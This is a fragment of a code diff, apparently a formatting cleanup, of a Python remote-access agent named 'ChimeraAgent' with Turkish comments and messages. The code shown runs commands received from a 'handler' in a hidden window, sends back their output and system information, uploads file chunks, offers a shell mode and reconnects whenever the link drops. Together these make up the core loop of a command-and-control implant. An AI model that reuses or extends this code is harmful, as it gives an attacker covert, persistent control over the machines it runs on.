                 return f"[+] Chunk başarıyla yüklendi: {target_path} offset {offset} ({len(file_content)} bytes)"
             except Exception as e:
-                return f"[!] Yükleme hatası: {str(e)}"
+                return f"[!] Yükleme hatası: {e!s}"
 
         try:
             # Komutu gizli pencerede çalıştır
@@ -4138,47 +4329,50 @@ class ChimeraAgent:
                 cmd,
                 shell=True,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.STDOUT, 
+                stderr=subprocess.STDOUT,
                 stdin=subprocess.PIPE,
-                startupinfo=startupinfo
+                startupinfo=startupinfo,
             )
             stdout, _ = proc.communicate(timeout=30)
-            
+
             # Windows için decoding (cp1254, utf-8 vs.)
             try:
-                result = stdout.decode("cp1254") if sys.platform == "win32" else stdout.decode("utf-8")
+                result = (
+                    stdout.decode("cp1254")
+                    if sys.platform == "win32"
+                    else stdout.decode("utf-8")
+                )
             except:
                 result = stdout.decode("utf-8", errors="ignore")
-            
+
             if not result.strip():
                 if proc.returncode == 0:
                     result = "[+] Komut başarıyla çalıştırıldı (Çıktı yok)."
                 else:
                     result = f"[!] Komut hatayla bitti - çıkış kodu: {proc.returncode}"
-            
+
             return result
         except subprocess.TimeoutExpired:
             proc.kill()
             return "[!] Komut zaman aşımına uğradı (30s)"
         except Exception as e:
-            return f"[!] Komut Çalıştırma Hatası: {str(e)}"
+            return f"[!] Komut Çalıştırma Hatası: {e!s}"
 
     # --------------------------------------------------------
     # Ana Döngü
     # --------------------------------------------------------
     def run(self):
         """Ajanın ana çalışma döngüsü.
-        
+
         1. Handler'a bağlan
         2. Sistem bilgisini gönder
         3. Komut al → çalıştır → sonuç gönder döngüsü
         4. Bağlantı koparsa yeniden bağlan
         """
         # İlk bağlantı
-        if not self.connect():
-            if not self.reconnect():
-                return
-        
+        if not self.connect() and not self.reconnect():
+            return
+
         # Sistem bilgisini gönder
         self.send_sysinfo()
 
@@ -4192,22 +4386,21 @@ class ChimeraAgent:
                     if not self.reconnect():
                         break
                     continue
-                
+
                 # Komutu çalıştır
                 output = self.execute_command(cmd)
-                
+
                 # Shell modu kendi iletişimini yönetir, sentinel dönerse gönderme
                 if output == "__SHELL_COMPLETED__":
                     continue
-                
+
                 # Sonucu gönder
                 self.send_data(output)
-                
+
             except Exception:
                 # Herhangi bir hata durumunda yeniden bağlan
-                if self.running:
-                    if not self.reconnect():
-                        break
+                if self.running and not self.reconnect():
+                    break
 
         # Temiz çıkış
         self.close_socket()
